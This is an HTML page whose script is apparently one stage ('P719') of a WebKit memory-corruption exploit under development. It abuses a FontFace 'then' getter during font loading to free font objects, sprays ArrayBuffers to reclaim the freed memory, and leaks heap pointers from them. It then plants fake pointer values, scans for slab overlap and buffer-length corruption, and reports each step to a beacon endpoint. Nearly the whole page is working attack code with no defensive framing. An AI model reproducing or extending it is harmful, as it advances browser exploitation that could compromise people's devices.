<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P719 — Lean 100-Slab q11 (+3,520B) Overlap Scout</title>
<script>
'use strict';
/* ============================================================
 * P719 — Lean 100-Slab q11 (+3,520B) Overlap Scout
 *
 * Engineering Optimization from P717 & P718:
 * - P718 crashed because allocating 200 wrapper objects {ab, view, k}
 *   inside the FontFace.then getter triggered a JSC GC threshold.
 * - P717 (80 buffers) succeeded cleanly with nz=16 and baseK=68!
 * - P719 uses a LEAN 100-buffer flat array (zero wrapper objects).
 * - 100 buffers comfortably reaches baseK + 18 (index 86), perfectly
 *   capturing the q11 (+3,520B) target slab!
 * ============================================================ */

function h16(v){ return ('0000000000000000'+BigInt(v||0).toString(16)).slice(-16); }

function b(tag,data){ try{var x=new XMLHttpRequest();
  x.open('GET','/beacon.php?tag=P719-'+encodeURIComponent(tag)+
    '&data='+encodeURIComponent(String(data||'').slice(0,700))+'&t='+Date.now(),false);
  x.send(null);}catch(e){} }

function log(s){
  var el = document.getElementById('out');
  if(el) el.textContent += s + '\n';
}

var P58 = null, P68 = null;
var FACE_B = null, BUF_B = null, VIEW_B = null;
var ABS_W = [];

function run(){
  b('BOOT','p719-lean-scout');
  log('=== P719 Lean 100-Slab q11 Overlap Scout ===\n');

  /* Step 1: Baseline Leak */
  log('[Step 1] Baseline heap leak...');
  doLeak(function(){
    log('P58 = 0x' + h16(P58));
    log('P68 = 0x' + h16(P68) + '\n');

    /* Step 2: Lean 100-Slab Reclaim */
    log('[Step 2] Executing lean 100-slab reclaim...');
    doLeanReclaim(function(){
      /* Step 3: Scan for q11 (+3,520B) Overlap */
      log('\n[Step 3] Scanning slabs around baseK + 18...');
      scanTargetSlabs();
    });
  });
}

/* ---- Step 1: Baseline Leak ---- */
function doLeak(cb){
  b('LEAK-GO','');
  var st = document.createElement('style');
  st.textContent = '@font-face{font-family:lk0;src:local(serif);unicode-range:U+0042;}';
  document.head.appendChild(st);

  var face = new FontFace('fl0','local(Times)',{unicodeRange:'U+0041'});
  document.fonts.add(face);
  void face.loaded;

  var abs = [], fired = false;
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
    get:function(){
      if(fired) return undefined; fired=true;
      if(st){st.remove(); st.textContent=''; st=null;}
      try{document.fonts.delete(this);}catch(e){}
      document.body.offsetHeight;
      for(var k=0;k<70;k++) abs.push(new ArrayBuffer(192));
      try{document.fonts.check('1em lk0');}catch(e){}
      document.body.offsetHeight;
      return undefined;
    }, set:function(){}});

  document.fonts.load('1em fl0, lk0','AB');

  setTimeout(function(){
    delete FontFace.prototype.then;
    var best=-1, bestNz=0;
    for(var i=0;i<abs.length;i++){
      var u=new Uint8Array(abs[i]), nz=0;
      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
      if(nz>bestNz){bestNz=nz; best=i;}
    }

    if(best<0 || bestNz<4){
      b('LEAK-MISS','nz='+bestNz);
      doLeakRetry(cb);
      return;
    }

    var v = new BigUint64Array(abs[best]);
    extractPointers(v);

    if(!P58){
      b('LEAK-NOPTR','nz='+bestNz);
      doLeakRetry(cb);
      return;
    }

    b('LEAK-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68)+'|nz='+bestNz);
    setTimeout(cb, 100);
  }, 350);
}

function doLeakRetry(cb){
  b('LEAK-RETRY','');
  var st2 = document.createElement('style');
  st2.textContent = '@font-face{font-family:lk1;src:local(serif);unicode-range:U+0043;}';
  document.head.appendChild(st2);

  var face2 = new FontFace('fl1','local(Times)',{unicodeRange:'U+0044'});
  document.fonts.add(face2);
  void face2.loaded;

  var abs2 = [], fired2 = false;
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
    get:function(){
      if(fired2) return undefined; fired2=true;
      if(st2){st2.remove(); st2.textContent=''; st2=null;}
      try{document.fonts.delete(this);}catch(e){}
      document.body.offsetHeight;
      for(var k=0;k<80;k++) abs2.push(new ArrayBuffer(192));
      try{document.fonts.check('1em lk1');}catch(e){}
      document.body.offsetHeight;
      return undefined;
    }, set:function(){}});

  document.fonts.load('1em fl1, lk1','CD');

  setTimeout(function(){
    delete FontFace.prototype.then;
    var best=-1, bestNz=0;
    for(var i=0;i<abs2.length;i++){
      var u=new Uint8Array(abs2[i]), nz=0;
      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
      if(nz>bestNz){bestNz=nz; best=i;}
    }
    if(best<0 || bestNz<4){ b('LEAK-RETRY-MISS','nz='+bestNz); return; }
    var v = new BigUint64Array(abs2[best]);
    extractPointers(v);
    if(!P58){ b('LEAK-RETRY-NOPTR','nz='+bestNz); return; }
    b('LEAK-RETRY-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68));
    setTimeout(cb, 100);
  }, 400);
}

function extractPointers(v){
  var LOW = BigInt('0x1000000000');
  var HIGH = BigInt('0x80000000000');
  for(var q=0;q<24;q++){
    var val = v[q];
    if(val >= LOW && val < HIGH){
      if(!P58) P58 = val;
      else if(!P68 && val !== P58) P68 = val;
    }
  }
  if(!P68) P68 = 0n;
}

/* ---- Step 2: Lean 100-Slab Reclaim ---- */
function doLeanReclaim(cb){
  b('RECLAIM-GO', 'fill_q12_q6=0x' + h16(P58));

  var stW = document.createElement('style');
  stW.textContent = '@font-face{font-family:winFam;src:local(Arial);unicode-range:U+0047;}';
  document.head.appendChild(stW);

  FACE_B = new FontFace('winFace', 'local(Helvetica)', {unicodeRange:'U+0048'});
  document.fonts.add(FACE_B);
  void FACE_B.loaded;

  var firedW = false;
  ABS_W = [];

  Object.defineProperty(FontFace.prototype, 'then', {
    configurable: true,
    get: function(){
      if(firedW) return undefined; firedW = true;
      if(stW){ stW.remove(); stW.textContent = ''; stW = null; }
      try{ document.fonts.delete(this); }catch(e){}
      document.body.offsetHeight;

      /* Lean loop: Allocate exactly 100 ArrayBuffers, no extra object allocations */
      for(var k=0; k<100; k++){
        var ab = new ArrayBuffer(192);
        var view = new BigUint64Array(ab);
        view[12] = P58;
        view[6]  = P58;
        view[23] = BigInt('0xC000000000000000') | BigInt(k);
        ABS_W.push(ab);
      }
      try{ document.fonts.check('1em winFam'); }catch(e){}
      return undefined;
    }, set: function(){}
  });

  document.fonts.load('1em winFace, winFam', 'GH');

  setTimeout(function(){
    delete FontFace.prototype.then;

    var best = -1, bestNz = 0;
    for(var i=0; i<ABS_W.length; i++){
      var u = new Uint8Array(ABS_W[i]), nz = 0;
      for(var j=0; j<u.length; j++) if(u[j] !== 0) nz++;
      if(nz > bestNz){ bestNz = nz; best = i; }
    }

    if(best < 0 || bestNz < 4){
      b('RECLAIM-MISS', 'nz=' + bestNz);
      log('Reclaim missed!');
      return;
    }

    BUF_B = ABS_W[best];
    VIEW_B = new BigUint64Array(BUF_B);
    var baseK = best;

    var dumpStr = 'baseK=' + baseK + '|nz=' + bestNz +
                  '|q0=0x' + h16(VIEW_B[0]) + '|q11=0x' + h16(VIEW_B[11]) +
                  '|q12=0x' + h16(VIEW_B[12]) + '|q13=0x' + h16(VIEW_B[13]);
    b('RECLAIM-OK', dumpStr);
    log('Live Reclaim OK: ' + dumpStr);

    setTimeout(cb, 100);
  }, 400);
}

/* ---- Step 3: Scan Target Slabs ---- */
function scanTargetSlabs(){
  var baseK = -1;
  for(var i=0; i<ABS_W.length; i++){
    if(ABS_W[i] === BUF_B){ baseK = i; break; }
  }

  var q11_val = VIEW_B ? VIEW_B[11] : 0n;
  var touched = [];

  /* Scan all 100 buffers */
  for(var i=0; i<ABS_W.length; i++){
    if(ABS_W[i] === BUF_B) continue;

    var v = new BigUint64Array(ABS_W[i]);
    var mod = [];
    for(var q=0; q<24; q++){
      var exp = 0n;
      if(q === 6 || q === 12) exp = P58;
      else if(q === 23) exp = BigInt('0xC000000000000000') | BigInt(i);

      if(v[q] !== exp){
        mod.push('q' + q + '=0x' + h16(v[q]));
      }
    }

    if(mod.length > 0){
      touched.push({ k: i, delta: (i - baseK), changes: mod });
      log('>> HIT: Buffer #' + i + ' (delta=' + (i - baseK) + ') modified by WebKit: ' + mod.slice(0, 3).join(', '));
    }
  }

  /* Specifically inspect baseK + 18 and baseK + 19 */
  var k18_val = 'none', k19_val = 'none';
  if(baseK + 18 < ABS_W.length){
    var v18 = new BigUint64Array(ABS_W[baseK + 18]);
    k18_val = 'q0=0x' + h16(v18[0]) + '|q1=0x' + h16(v18[1]) + '|q11=0x' + h16(v18[11]);
  }
  if(baseK + 19 < ABS_W.length){
    var v19 = new BigUint64Array(ABS_W[baseK + 19]);
    k19_val = 'q0=0x' + h16(v19[0]) + '|q1=0x' + h16(v19[1]) + '|q11=0x' + h16(v19[11]);
  }

  var scanReport = 'baseK=' + baseK + '|q11=0x' + h16(q11_val) +
                   '|k18=' + k18_val + '|k19=' + k19_val +
                   '|touchedCount=' + touched.length;
  if(touched.length > 0){
    var det = touched.map(function(t){ return 'k' + t.k + '(d=' + t.delta + ':' + t.changes.slice(0, 2).join(',') + ')'; }).join(';');
    b('COLLISION-HIT', scanReport + '|det=' + det.slice(0, 500));
    log('\n*** SLAB OVERLAP DETECTED! ***\n' + det);
  } else {
    b('COLLISION-SCAN', scanReport);
    log('Target slabs inspected: ' + scanReport);
  }

  /* Check byteLengths */
  var lenExp = [];
  for(var i=0; i<ABS_W.length; i++){
    if(ABS_W[i].byteLength !== 192){
      lenExp.push('k' + i + ':len=' + ABS_W[i].byteLength);
    }
  }

  if(lenExp.length > 0){
    b('LENGTH-EXPANDED', lenExp.join(';'));
    log('!!! LENGTH CORRUPTED: ' + lenExp.join(', '));
  } else {
    b('LENGTH-NORMAL', 'checked=100|all=192B');
    log('All 100 buffers at 192 bytes.');
  }

  b('DONE','p719-complete');
  log('\n=== P719 Complete! ===');
}

if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
else document.addEventListener('DOMContentLoaded',run);
</script>
</head><body><pre id="out">P719 — Initializing Lean 100-Slab Scout...</pre></body></html>
